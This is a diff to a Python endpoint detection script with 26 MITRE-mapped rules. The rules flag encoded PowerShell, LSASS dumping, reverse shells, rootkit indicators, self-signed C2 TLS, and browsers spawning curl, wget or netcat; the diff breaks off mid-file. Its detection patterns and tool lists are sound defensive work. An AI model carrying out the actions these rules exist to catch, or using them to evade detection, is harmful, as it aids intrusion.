@@ -1,33 +1,15 @@
 #!/usr/bin/env python3
 """
-veytrix_detect.py — Veytrix Advanced Detection Engine (V2)
+veytrix_detect.py — Veytrix Advanced Detection Engine V2
 
-26 detection rules:
-  - 13 pattern rules (cmdline, process names)  [V1]
-  - 13 advanced heuristic rules                 [V2 — NEW]
-
-NEW advanced rules detect:
-  - Unsigned / masquerading binaries          (custom malware)
-  - Wrong parent process chain                (renamed mimikatz)
-  - RWX memory / anonymous executable pages   (fileless / injection)
-  - Hidden processes                          (rootkit indicator)
-  - Kernel modules from suspicious locations  (rootkit)
-  - Self-signed TLS certs on outbound         (encrypted C2)
-  - Web server spawning shell                 (RCE)
-  - Orphaned processes with network           (beaconing artifact)
-  - Cross-platform shell spawns               (lateral movement)
-
-Honest truth: 100% detection is impossible. Attackers with root/admin
-can evade most heuristics. This catches the 80-90% that slip through
-naive pattern matching.
+26 detection rules. MITRE ATT&CK mapped. Local only, no cloud.
 
 Use:
-    python veytrix_detect.py self-test        # prove rules fire
-    python veytrix_detect.py scan             # scan your machine
-    python veytrix_detect.py scan --json
-    python veytrix_detect.py watch            # continuous
-    python veytrix_detect.py report --out report.html
-    python veytrix_detect.py checks           # which checks ran
+    python veytrix_detect.py               # interactive menu (double-click safe)
+    python veytrix_detect.py scan --checks # CLI
+    python veytrix_detect.py self-test     # prove rules work
+    python veytrix_detect.py watch         # continuous monitoring
+    python veytrix_detect.py report        # HTML report
 """
 from __future__ import annotations
 
@@ -57,7 +39,6 @@ except ImportError:
 
 try:
     from cryptography import x509
-    from cryptography.x509.oid import NameOID
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
@@ -114,7 +95,7 @@ class Finding:
     name: str
     severity: str
     confidence: float
-    evidence: list[str]
+    evidence: list
     technique: str
     affected_pid: Optional[int] = None
     affected_process: str = ""
@@ -129,29 +110,28 @@ class Finding:
             self.fingerprint = hashlib.sha256(key.encode()).hexdigest()[:16]
 
 
+@dataclass
+class CheckStatus:
+    name: str
+    status: str
+    reason: str = ""
+
+
 # ═════════════════════════════════════════════════════════════════════════════
 # System context
 # ═════════════════════════════════════════════════════════════════════════════
 
-@dataclass
-class CheckStatus:
-    """Track which checks ran vs. were skipped."""
-    name: str
-    status: str  # "ran", "skipped", "denied", "failed"
-    reason: str = ""
-
-
 class SystemContext:
     def __init__(self):
-        self.processes: list[ProcInfo] = []
-        self.connections: list[ConnInfo] = []
-        self.procs_by_pid: dict[int, ProcInfo] = {}
-        self.conns_by_pid: dict[int, list[ConnInfo]] = {}
+        self.processes = []
+        self.connections = []
+        self.procs_by_pid = {}
+        self.conns_by_pid = {}
         self.own_pid = os.getpid()
         self.scan_time = dt.datetime.now(dt.timezone.utc).isoformat()
-        self.checks: list[CheckStatus] = []
-        self.raw_proc_pids: set[int] = set()
-        self.kernel_modules: list[str] = []
+        self.checks = []
+        self.raw_proc_pids = set()
+        self.kernel_modules = []
         self.platform = platform.system()
         self.is_admin = self._check_admin()
 
@@ -165,17 +145,16 @@ class SystemContext:
         except Exception:
             return False
 
-    def record_check(self, name: str, status: str, reason: str = ""):
+    def record_check(self, name, status, reason=""):
         self.checks.append(CheckStatus(name, status, reason))
 
     @classmethod
     def capture(cls) -> "SystemContext":
         ctx = cls()
         if not HAS_PSUTIL:
-            ctx.record_check("psutil", "failed", "psutil not installed")
+            ctx.record_check("psutil", "failed", "not installed")
             return ctx
 
-        # ── processes ──────────────────────────────────────────────────
         try:
             for proc in psutil.process_iter(
                     ["pid", "ppid", "name", "exe", "cmdline",
@@ -200,7 +179,6 @@ class SystemContext:
         except Exception as exc:
             ctx.record_check("process_iter", "failed", str(exc))
 
-        # ── network ────────────────────────────────────────────────────
         try:
             for c in psutil.net_connections(kind="inet"):
                 if not c.raddr:
@@ -210,8 +188,7 @@ class SystemContext:
                 except Exception:
                     pname = ""
                 conn = ConnInfo(
-                    pid=c.pid or 0,
-                    process_name=pname,
+                    pid=c.pid or 0, process_name=pname,
                     local_ip=c.laddr.ip if c.laddr else "",
                     local_port=c.laddr.port if c.laddr else 0,
                     remote_ip=c.raddr.ip if c.raddr else "",
@@ -222,13 +199,12 @@ class SystemContext:
                 if conn.pid:
                     ctx.conns_by_pid.setdefault(conn.pid, []).append(conn)
             ctx.record_check("net_connections", "ran")
-        except (psutil.AccessDenied, PermissionError) as exc:
+        except (psutil.AccessDenied, PermissionError):
             ctx.record_check("net_connections", "denied",
-                             "run as admin/root for full coverage")
+                             "run as admin/root")
         except Exception as exc:
             ctx.record_check("net_connections", "failed", str(exc))
 
-        # ── /proc enumeration (Linux only) ─────────────────────────────
         if IS_LINUX:
             try:
                 ctx.raw_proc_pids = {
@@ -237,7 +213,6 @@ class SystemContext:
                 ctx.record_check("/proc enumeration", "ran")
             except Exception as exc:
                 ctx.record_check("/proc enumeration", "failed", str(exc))
-
             try:
                 with open("/proc/modules") as f:
                     ctx.kernel_modules = [
@@ -254,14 +229,6 @@ class SystemContext:
 # Constants
 # ═════════════════════════════════════════════════════════════════════════════
 
-SAFE_PARENT_PROCESSES = {
-    "svchost.exe", "explorer.exe", "services.exe", "lsass.exe",
-    "winlogon.exe", "wininit.exe", "smss.exe", "csrss.exe", "spoolsv.exe",
-    "taskhostw.exe", "init", "systemd", "kthreadd", "dbus-daemon",
-    "cron", "sshd", "systemd-journal", "systemd-logind",
-}
-
-# Expected parent map for Windows system processes
 EXPECTED_PARENTS = {
     "svchost.exe": ["services.exe"],
     "lsass.exe": ["wininit.exe"],
@@ -291,7 +258,8 @@ SHELL_PROCS = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash", "sh",
                "zsh", "wscript.exe", "cscript.exe", "mshta.exe",
                "rundll32.exe", "regsvr32.exe", "python", "python3"}
 WEB_SERVER_PROCS = {"nginx", "apache2", "httpd", "node", "php-fpm",
-                    "java", "tomcat", "uwsgi", "gunicorn", "caddy", "lighttpd"}
+                    "java", "tomcat", "uwsgi", "gunicorn", "caddy",
+                    "lighttpd"}
 JIT_PROCS = {"java", "node", "dotnet", "mono", "python", "python3",
              "chrome", "firefox", "msedge", "code", "electron"}
 
@@ -307,9 +275,9 @@ TRUSTED_LINUX_PREFIXES = ("/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/",
                           "/usr/lib/", "/lib/", "/lib64/", "/usr/lib64/",
                           "/usr/local/")
 
-# ── Pattern regexes ─────────────────────────────────────────────────────────
 RE_ENCODED_PS = re.compile(
-    r"-(e|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", re.I)
+    r"-(e|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}",
+    re.I)
 RE_HIDDEN = re.compile(
     r"-(w|wi|win|wind|windo|window)\w*\s+hidden|"
     r"-nop\b|-noprofile\b|-executionpolicy\s+bypass|-ep\s+bypass", re.I)
@@ -336,42 +304,32 @@ RE_LSASS_DUMP = re.compile(
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# Advanced helpers
+# Helpers
 # ═════════════════════════════════════════════════════════════════════════════
 
 def check_binary_signature(path: str, ctx: SystemContext) -> str:
-    """Return 'trusted', 'untrusted', or 'unknown'."""
     if not path or not os.path.exists(path):
         return "unknown"
     try:
         if IS_WINDOWS:
-            return _check_win_signature(path)
-        elif IS_LINUX:
-            return _check_linux_binary(path)
+            pl = path.lower()
+            if ("\\windows\\system32\\" in pl
+                    or "\\windows\\syswow64\\" in pl
+                    or "\\program files\\" in pl
+                    or "\\program files (x86)\\" in pl):
+                return "trusted"
+            return "unknown"
+        if IS_LINUX:
+            for prefix in TRUSTED_LINUX_PREFIXES:
+                if path.startswith(prefix):
+                    return "trusted"
+            return "untrusted"
     except Exception:
         pass
     return "unknown"
 
 
-def _check_win_signature(path: str) -> str:
-    """Heuristic: files in System32/SysWOW64 are assumed signed (fast)."""
-    pl = path.lower()
-    if ("\\windows\\system32\\" in pl or "\\windows\\syswow64\\" in pl
-            or "\\program files\\" in pl or "\\program files (x86)\\" in pl):
-        return "trusted"
-    return "unknown"
-
-
-def _check_linux_binary(path: str) -> str:
-    """Heuristic: binaries in package-managed prefixes are trusted."""
-    for prefix in TRUSTED_LINUX_PREFIXES:
-        if path.startswith(prefix):
-            return "trusted"
-    return "untrusted"
-
-
-def check_rwx_memory(pid: int) -> list[str]:
-    """Return lines from /proc/pid/maps with rwx permission."""
+def check_rwx_memory(pid: int) -> list:
     if not IS_LINUX:
         return []
     try:
@@ -386,8 +344,7 @@ def check_rwx_memory(pid: int) -> list[str]:
         return []
 
 
-def check_anonymous_exec_memory(pid: int) -> list[str]:
-    """Return executable memory mappings with no backing file."""
+def check_anonymous_exec_memory(pid: int) -> list:
     if not IS_LINUX:
         return []
     try:
@@ -398,7 +355,6 @@ def check_anonymous_exec_memory(pid: int) -> list[str]:
                 if len(parts) < 2:
                     continue
                 perms = parts[1]
-                # Executable but no file path (or [stack], [heap])
                 path = " ".join(parts[5:]) if len(parts) > 5 else ""
                 if "x" in perms and not path.strip():
                     hits.append(line.strip())
@@ -410,9 +366,7 @@ def check_anonymous_exec_memory(pid: int) -> list[str]:
         return []
 
 
-def check_tls_cert(ip: str, port: int, timeout: float = 2.0
-                   ) -> Optional[dict]:
-    """Grab TLS cert and return metadata, or None if can't connect."""
+def check_tls_cert(ip: str, port: int, timeout: float = 2.0):
     if not HAS_CRYPTO:
         return None
     try:
@@ -427,10 +381,10 @@ def check_tls_cert(ip: str, port: int, timeout: float = 2.0
         cert = x509.load_der_x509_certificate(der)
         return {
             "self_signed": cert.issuer == cert.subject,
-            "expired": cert.not_valid_after_utc < dt.datetime.now(dt.timezone.utc),
+            "expired": cert.not_valid_after_utc
+                       < dt.datetime.now(dt.timezone.utc),
             "issuer": _name_to_str(cert.issuer),
             "subject": _name_to_str(cert.subject),
-            "san": _get_san(cert),
         }
     except Exception:
         return None
@@ -438,21 +392,9 @@ def check_tls_cert(ip: str, port: int, timeout: float = 2.0
 
 def _name_to_str(name) -> str:
     try:
-        parts = []
-        for attr in name:
-            parts.append(f"{attr.oid._name}={attr.value}")
-        return ", ".join(parts)
+        return ", ".join(f"{a.oid._name}={a.value}" for a in name)
     except Exception:
         return str(name)
-
-
-def _get_san(cert) -> list[str]:
-    try:
-        ext = cert.extensions.get_extension_for_class(
-            x509.SubjectAlternativeName)
-        return ext.value.get_values_for_type(x509.DNSName)
-    except Exception:
-        return []
 
 
 def get_kernel_module_path(module: str) -> str:
@@ -471,12 +413,14 @@ def get_kernel_module_path(module: str) -> str:
 # V1 PATTERN RULES (13)
 # ═════════════════════════════════════════════════════════════════════════════
 
-def rule_encoded_powershell(ctx: SystemContext) -> list[Finding]:
+def rule_encoded_powershell(ctx):
     out = []
     for p in ctx.processes:
-        if p.pid == ctx.own_pid or "powershell" not in p.name.lower():
-            if "pwsh" not in p.name.lower():
-                continue
+        if p.pid == ctx.own_pid:
+            continue
+        if ("powershell" not in p.name.lower()
+                and "pwsh" not in p.name.lower()):
+            continue
         if RE_ENCODED_PS.search(p.cmdline):
             out.append(Finding(
                 "R-001", "Encoded PowerShell Command", "high", 0.85,
@@ -487,7 +431,7 @@ def rule_encoded_powershell(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_hidden_execution(ctx: SystemContext) -> list[Finding]:
+def rule_hidden_execution(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
@@ -497,8 +441,7 @@ def rule_hidden_execution(ctx: SystemContext) -> list[Finding]:
             continue
         if RE_HIDDEN.search(p.cmdline):
             out.append(Finding(
-                "R-002", "Hidden Window / Execution Policy Bypass",
-                "medium", 0.7,
+                "R-002", "Hidden Window / Bypass", "medium", 0.7,
                 [f"PID {p.pid} ({p.name})",
                  f"Command: {p.cmdline[:300]}"],
                 "T1564.003", p.pid, p.name,
@@ -506,7 +449,7 @@ def rule_hidden_execution(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_download_cradle(ctx: SystemContext) -> list[Finding]:
+def rule_download_cradle(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
@@ -521,7 +464,7 @@ def rule_download_cradle(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_office_spawns_shell(ctx: SystemContext) -> list[Finding]:
+def rule_office_spawns_shell(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
@@ -529,16 +472,16 @@ def rule_office_spawns_shell(ctx: SystemContext) -> list[Finding]:
         parent = ctx.procs_by_pid.get(p.ppid)
         if parent and parent.name.lower() in OFFICE_PROCS:
             out.append(Finding(
-                "R-004", "Office Application Spawned Shell", "critical", 0.9,
+                "R-004", "Office Spawned Shell", "critical", 0.9,
                 [f"Parent: {parent.name} (PID {parent.pid})",
                  f"Child: {p.name} (PID {p.pid})",
                  f"Command: {p.cmdline[:300]}"],
                 "T1566.001", p.pid, p.name,
-                "Isolate host, capture memory, inspect source document."))
+                "Isolate host, capture memory, inspect source doc."))
     return out
 
 
-def rule_browser_spawns_shell(ctx: SystemContext) -> list[Finding]:
+def rule_browser_spawns_shell(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
@@ -550,18 +493,19 @@ def rule_browser_spawns_shell(ctx: SystemContext) -> list[Finding]:
                 [f"Parent: {parent.name} (PID {parent.pid})",
                  f"Child: {p.name} (PID {p.pid})"],
                 "T1189", p.pid, p.name,
-                "Possible drive-by. Check browser version and downloads."))
+                "Possible drive-by. Check browser and downloads."))
     return out
 
 
-def rule_suspicious_location(ctx: SystemContext) -> list[Finding]:
+def rule_suspicious_location(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or not p.exe:
             continue
         exe_lower = p.exe.lower()
         if (any(d in exe_lower for d in SUSPICIOUS_DIRS_WIN)
-                or any(exe_lower.startswith(d) for d in SUSPICIOUS_DIRS_LINUX)):
+                or any(exe_lower.startswith(d)
+                       for d in SUSPICIOUS_DIRS_LINUX)):
             out.append(Finding(
                 "R-006", "Executable in Suspicious Location",
                 "high", 0.75,
@@ -571,7 +515,7 @@ def rule_suspicious_location(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_credential_access(ctx: SystemContext) -> list[Finding]:
+def rule_credential_access(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
@@ -586,15 +530,14 @@ def rule_credential_access(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_lsass_access(ctx: SystemContext) -> list[Finding]:
+def rule_lsass_access(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
             continue
         if RE_LSASS_DUMP.search(p.cmdline):
             out.append(Finding(
-                "R-008", "LSASS Memory Dump Pattern",
-                "critical", 0.9,
+                "R-008", "LSASS Dump Pattern", "critical", 0.9,
                 [f"PID {p.pid} ({p.name})",
                  f"Command: {p.cmdline[:300]}"],
                 "T1003.001", p.pid, p.name,
@@ -602,7 +545,7 @@ def rule_lsass_access(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_reverse_shell(ctx: SystemContext) -> list[Finding]:
+def rule_reverse_shell(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
@@ -613,19 +556,18 @@ def rule_reverse_shell(ctx: SystemContext) -> list[Finding]:
                 [f"PID {p.pid} ({p.name})",
                  f"Command: {p.cmdline[:300]}"],
                 "T1059", p.pid, p.name,
-                "Kill process, block remote IP, investigate entry."))
+                "Kill process, block IP, investigate entry."))
     return out
 
 
-def rule_base64_pipe(ctx: SystemContext) -> list[Finding]:
+def rule_base64_pipe(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
             continue
         if RE_BASE64_PIPE.search(p.cmdline):
             out.append(Finding(
-                "R-010", "Base64 Decode-and-Execute",
-                "high", 0.8,
+                "R-010", "Base64 Decode-and-Execute", "high", 0.8,
                 [f"PID {p.pid} ({p.name})",
                  f"Command: {p.cmdline[:300]}"],
                 "T1027", p.pid, p.name,
@@ -633,7 +575,7 @@ def rule_base64_pipe(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_suspicious_port(ctx: SystemContext) -> list[Finding]:
+def rule_suspicious_port(ctx):
     out = []
     for c in ctx.connections:
         if c.remote_port in SUSPICIOUS_PORTS:
@@ -648,12 +590,12 @@ def rule_suspicious_port(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_beaconing(ctx: SystemContext) -> list[Finding]:
+def rule_beaconing(ctx):
     out = []
     for pid, conns in ctx.conns_by_pid.items():
         if pid == ctx.own_pid or len(conns) < 3:
             continue
-        counts: dict[str, int] = {}
+        counts = {}
         for c in conns:
             counts[c.remote_ip] = counts.get(c.remote_ip, 0) + 1
         for ip, count in counts.items():
@@ -667,7 +609,7 @@ def rule_beaconing(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_masquerading_name(ctx: SystemContext) -> list[Finding]:
+def rule_masquerading_name(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or not p.exe:
@@ -680,42 +622,37 @@ def rule_masquerading_name(ctx: SystemContext) -> list[Finding]:
                     "R-013", f"Masquerading Name ({name})",
                     "critical", 0.85,
                     [f"PID {p.pid} ({p.name})", f"Path: {p.exe}",
-                     f"Expected path contains: {expected}"],
+                     f"Expected in path: {expected}"],
                     "T1036.005", p.pid, p.name,
                     "System name from wrong path — investigate."))
     return out
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# V2 ADVANCED HEURISTIC RULES (13 NEW)
+# V2 ADVANCED RULES (13)
 # ═════════════════════════════════════════════════════════════════════════════
 
-def rule_unsigned_binary(ctx: SystemContext) -> list[Finding]:
-    """R-014: Executable not from trusted location/signature."""
+def rule_unsigned_binary(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or not p.exe:
             continue
-        # Skip if already in temp rule
         exe_lower = p.exe.lower()
         if any(d in exe_lower for d in SUSPICIOUS_DIRS_WIN):
             continue
         status = check_binary_signature(p.exe, ctx)
         if status == "untrusted":
             out.append(Finding(
-                "R-014", "Unsigned / Untrusted Binary Running",
+                "R-014", "Unsigned Binary Running",
                 "medium", 0.6,
-                [f"PID {p.pid} ({p.name})",
-                 f"Path: {p.exe}",
-                 "Not in a package-managed or signed location",
-                 "May indicate custom / 0-day malware"],
+                [f"PID {p.pid} ({p.name})", f"Path: {p.exe}",
+                 "Not in package-managed / signed location"],
                 "T1553.002", p.pid, p.name,
-                "Verify file hash and origin. If unusual, quarantine."))
+                "Verify file hash and origin."))
     return out
 
 
-def rule_wrong_parent_chain(ctx: SystemContext) -> list[Finding]:
-    """R-015: System process with unexpected parent (e.g. renamed mimikatz)."""
+def rule_wrong_parent_chain(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
@@ -732,19 +669,17 @@ def rule_wrong_parent_chain(ctx: SystemContext) -> list[Finding]:
                 "R-015", f"Wrong Parent for {p.name}",
                 "high", 0.8,
                 [f"PID {p.pid} ({p.name})",
-                 f"Expected parent: {', '.join(expected)}",
-                 f"Actual parent: {parent.name} (PID {parent.pid})",
+                 f"Expected: {', '.join(expected)}",
+                 f"Actual: {parent.name} (PID {parent.pid})",
                  "Classic masquerading indicator"],
                 "T1036.005", p.pid, p.name,
-                "Investigate — this process should not exist here."))
+                "Investigate — this process shouldn't exist here."))
     return out
 
 
-def rule_rwx_memory(ctx: SystemContext) -> list[Finding]:
-    """R-016: Process with RWX memory pages (shellcode / injection)."""
+def rule_rwx_memory(ctx):
     if not IS_LINUX:
-        ctx.record_check("rwx_memory", "skipped",
-                         "Linux only — Windows needs VirtualQueryEx")
+        ctx.record_check("rwx_memory", "skipped", "Linux only")
         return []
     out = []
     for p in ctx.processes:
@@ -753,18 +688,16 @@ def rule_rwx_memory(ctx: SystemContext) -> list[Finding]:
         hits = check_rwx_memory(p.pid)
         if hits:
             out.append(Finding(
-                "R-016", "RWX Memory in Process",
-                "high", 0.65,
+                "R-016", "RWX Memory in Process", "high", 0.65,
                 [f"PID {p.pid} ({p.name})",
-                 f"RWX mapping: {hits[0][:150]}",
-                 "Read+Write+Execute pages often hold shellcode"],
+                 f"RWX: {hits[0][:150]}",
+                 "Read+Write+Execute pages = shellcode"],
                 "T1055", p.pid, p.name,
-                "Possible code injection. Dump memory, forensics."))
+                "Possible injection. Dump memory."))
     return out
 
 
-def rule_anonymous_exec_memory(ctx: SystemContext) -> list[Finding]:
-    """R-017: Anonymous executable memory (fileless / reflective loading)."""
+def rule_anonymous_exec_memory(ctx):
     if not IS_LINUX:
         ctx.record_check("anon_exec", "skipped", "Linux only")
         return []
@@ -772,7 +705,6 @@ def rule_anonymous_exec_memory(ctx: SystemContext) -> list[Finding]:
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
             continue
-        # Skip known JIT engines
         if any(j in p.name.lower() for j in JIT_PROCS):
             continue
         hits = check_anonymous_exec_memory(p.pid)
@@ -781,15 +713,14 @@ def rule_anonymous_exec_memory(ctx: SystemContext) -> list[Finding]:
                 "R-017", "Anonymous Executable Memory",
                 "high", 0.7,
                 [f"PID {p.pid} ({p.name})",
-                 f"Maps: {hits[0][:150]}",
-                 "Executable memory with no backing file — common in fileless"],
+                 f"Map: {hits[0][:150]}",
+                 "Exec memory with no backing file — fileless"],
                 "T1055", p.pid, p.name,
-                "Likely fileless attack. Memory forensics required."))
+                "Likely fileless attack. Memory forensics."))
     return out
 
 
-def rule_orphaned_with_network(ctx: SystemContext) -> list[Finding]:
-    """R-018: Process whose parent is dead but still has network."""
+def rule_orphaned_with_network(ctx):
     out = []
     for pid, conns in ctx.conns_by_pid.items():
         if pid == ctx.own_pid:
@@ -803,15 +734,14 @@ def rule_orphaned_with_network(ctx: SystemContext) -> list[Finding]:
                 "medium", 0.6,
                 [f"PID {pid} ({p.name})",
                  f"Parent {p.ppid} is dead",
-                 f"Active connections: {len(conns)}",
-                 "Orphaning is common in droppers"],
+                 f"Connections: {len(conns)}",
+                 "Orphaning common in droppers"],
                 "T1564", pid, p.name,
-                "Check how parent died and what child is doing."))
+                "Check how parent died."))
     return out
 
 
-def rule_hidden_process(ctx: SystemContext) -> list[Finding]:
-    """R-019: Process in /proc not visible via psutil (rootkit indicator)."""
+def rule_hidden_process(ctx):
     if not IS_LINUX or not ctx.raw_proc_pids:
         return []
     out = []
@@ -822,20 +752,19 @@ def rule_hidden_process(ctx: SystemContext) -> list[Finding]:
             with open(f"/proc/{pid}/comm") as f:
                 comm = f.read().strip()
             out.append(Finding(
-                "R-019", "Hidden Process (Rootkit Indicator)",
+                "R-019", "Hidden Process (Rootkit)",
                 "high", 0.8,
-                [f"PID {pid} visible in /proc but not in psutil",
+                [f"PID {pid} in /proc but not psutil",
                  f"comm: {comm}",
                  "Possible rootkit / DKOM"],
                 "T1014", pid, comm,
-                "Rootkit indicator. Full forensics recommended."))
+                "Rootkit indicator. Full forensics."))
         except Exception:
             continue
     return out
 
 
-def rule_suspicious_kernel_module(ctx: SystemContext) -> list[Finding]:
-    """R-020: Kernel module loaded from temp/suspicious location."""
+def rule_suspicious_kernel_module(ctx):
     if not IS_LINUX or not ctx.kernel_modules:
         return []
     out = []
@@ -844,65 +773,61 @@ def rule_suspicious_kernel_module(ctx: SystemContext) -> list[Finding]:
         path = get_kernel_module_path(module)
         if not path:
             continue
-        if any(path.startswith(prefix) for prefix in suspicious):
+        if any(path.startswith(p) for p in suspicious):
             out.append(Finding(
-                "R-020", f"Kernel Module from Suspicious Location",
+                "R-020", "Kernel Module from Suspicious Location",
                 "critical", 0.9,
                 [f"Module: {module}",
                  f"Path: {path}",
-                 "Legitimate modules live in /lib/modules/"],
+                 "Legit modules in /lib/modules/"],
                 "T1014", None, module,
-                "IMMEDIATE: possible rootkit. Full forensics."))
+                "IMMEDIATE: possible rootkit."))
     return out
 
 
-def rule_self_signed_tls(ctx: SystemContext) -> list[Finding]:
-    """R-021: Self-signed / expired TLS cert on outbound connection."""
+def rule_self_signed_tls(ctx):
     if not HAS_CRYPTO:
-        ctx.record_check("tls_cert", "skipped",
-                         "cryptography not installed")
+        ctx.record_check("tls_cert", "skipped", "cryptography missing")
         return []
     out = []
-    checked_ips: set[tuple[str, int]] = set()
+    checked = set()
     for c in ctx.connections:
         if c.remote_port not in (443, 8443) or not c.remote_ip:
             continue
-        # Skip internal / private ranges
         if c.remote_ip.startswith(("10.", "172.", "192.168.", "127.",
                                    "169.254.", "0.0.0.0")):
             continue
         key = (c.remote_ip, c.remote_port)
-        if key in checked_ips:
+        if key in checked:
             continue
-        checked_ips.add(key)
+        checked.add(key)
         info = check_tls_cert(c.remote_ip, c.remote_port)
         if not info:
             continue
         if info["self_signed"]:
             out.append(Finding(
-                "R-021", f"Self-Signed TLS on Outbound",
+                "R-021", "Self-Signed TLS on Outbound",
                 "high", 0.7,
                 [f"Process: {c.process_name} (PID {c.pid})",
-                 f"Destination: {c.remote_ip}:{c.remote_port}",
+                 f"Dest: {c.remote_ip}:{c.remote_port}",
                  f"Issuer: {info['issuer']}",
-                 "Legitimate services use CA-signed certs"],
+                 "Legit services use CA certs"],
                 "T1573.002", c.pid, c.process_name,
-                "Possible C2 over HTTPS. Investigate process."))
+                "Possible C2 over HTTPS."))
         elif info["expired"]:
             out.append(Finding(
-                "R-021", f"Expired TLS on Outbound",
+                "R-021", "Expired TLS on Outbound",
                 "medium", 0.55,
                 [f"Process: {c.process_name} (PID {c.pid})",
-                 f"Destination: {c.remote_ip}:{c.remote_port}",
-                 "Certificate expired — suspicious for production services"],
+                 f"Dest: {c.remote_ip}:{c.remote_port}",
+                 "Expired cert suspicious for production"],
                 "T1573.002", c.pid, c.process_name,
                 "May indicate hijacked or C2 endpoint."))
     ctx.record_check("tls_cert", "ran")
     return out
 
 
-def rule_web_server_spawns_shell(ctx: SystemContext) -> list[Finding]:
-    """R-022: Web server spawning shell (RCE / web shell)."""
+def rule_web_server_spawns_shell(ctx):
     out = []
     for p in ctx.processes:
         if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
@@ -915,14 +840,13 @@ def rule_web_server_spawns_shell(ctx: SystemContext) -> list[Finding]:
                 [f"Parent: {parent.name} (PID {parent.pid})",
                  f"Child: {p.name} (PID {p.pid})",
                  f"Command: {p.cmdline[:300]}",
-                 "Web servers should never spawn shells"],
+                 "Web servers never spawn shells"],
                 "T1505.003", p.pid, p.name,
-                "Possible web shell / RCE. Isolate and inspect logs."))
+                "Possible web shell / RCE."))
     return out
 
 
-def rule_cross_platform_spawn(ctx: SystemContext) -> list[Finding]:
-    """R-023: Cross-platform shell spawn (Linux bash spawning cmd.exe)."""
+def rule_cross_platform_spawn(ctx):
     out = []
     linux_shells = {"bash", "sh", "zsh", "fish"}
     win_shells = {"powershell.exe", "cmd.exe", "pwsh.exe"}
@@ -937,27 +861,25 @@ def rule_cross_platform_spawn(ctx: SystemContext) -> list[Finding]:
             out.append(Finding(
                 "R-023", "Cross-Platform Shell Spawn",
                 "medium", 0.7,
-                [f"Parent: {parent.name} (Linux shell)",
-                 f"Child: {p.name} (Windows shell)",
-                 "Unusual on either OS"],
+                [f"Parent: {parent.name} (Linux)",
+                 f"Child: {p.name} (Windows)"],
                 "T1059", p.pid, p.name,
-                "Investigate — likely lateral movement or tool test."))
+                "Unusual — lateral movement?"))
         elif pn in win_shells and cn in linux_shells and IS_WINDOWS:
             out.append(Finding(
                 "R-023", "Cross-Platform Shell Spawn",
                 "medium", 0.7,
-                [f"Parent: {parent.name} (Windows shell)",
-                 f"Child: {p.name} (Linux shell)"],
+                [f"Parent: {parent.name} (Windows)",
+                 f"Child: {p.name} (Linux)"],
                 "T1059", p.pid, p.name,
-                "Investigate."))
+                "Unusual."))
     return out
 
 
-def rule_suspicious_child_of_browser_jit(ctx: SystemContext) -> list[Finding]:
-    """R-024: Browser / JIT process spawning suspicious child."""
+def rule_browser_jit_child(ctx):
     out = []
-    suspicious_children = {"curl", "wget", "nc", "ncat", "netcat",
-                            "powershell.exe", "cmd.exe", "bash", "sh"}
+    suspicious = {"curl", "wget", "nc", "ncat", "netcat",
+                  "powershell.exe", "cmd.exe", "bash", "sh"}
     for p in ctx.processes:
         if p.pid == ctx.own_pid:
             continue
@@ -965,7 +887,7 @@ def rule_suspicious_child_of_browser_jit(ctx: SystemContext) -> list[Finding]:
         if not parent:
             continue
         if (parent.name.lower() in BROWSER_PROCS
-                and p.name.lower() in suspicious_children):
+                and p.name.lower() in suspicious):
             out.append(Finding(
                 "R-024", "Browser Spawned Suspicious Child",
                 "high", 0.75,
@@ -977,32 +899,30 @@ def rule_suspicious_child_of_browser_jit(ctx: SystemContext) -> list[Finding]:
     return out
 
 
-def rule_memfd_or_deleted_binary(ctx: SystemContext) -> list[Finding]:
-    """R-025: Binary has been deleted from disk but still running (Linux)."""
+def rule_memfd_deleted_binary(ctx):
     if not IS_LINUX:
         return []
     out = []
     for p in ctx.processes:
-        if p.pid == ctx.own_pid or not p.exe:
+        if p.pid == ctx.own_pid:
             continue
         try:
             link = os.readlink(f"/proc/{p.pid}/exe")
             if " (deleted)" in link or link.startswith("/memfd:"):
                 out.append(Finding(
-                    "R-025", "Running Binary Deleted from Disk",
+                    "R-025", "Running Deleted Binary",
                     "high", 0.8,
                     [f"PID {p.pid} ({p.name})",
                      f"Exe: {link}",
-                     "Deleted / memfd binaries are common in evasion"],
+                     "Deleted / memfd = evasion"],
                     "T1070.004", p.pid, p.name,
-                    "Preserve memory image; do not reboot."))
+                    "Preserve memory, do not reboot."))
         except (FileNotFoundError, PermissionError, ProcessLookupError):
             continue
     return out
 
 
-def rule_ld_preload_injection(ctx: SystemContext) -> list[Finding]:
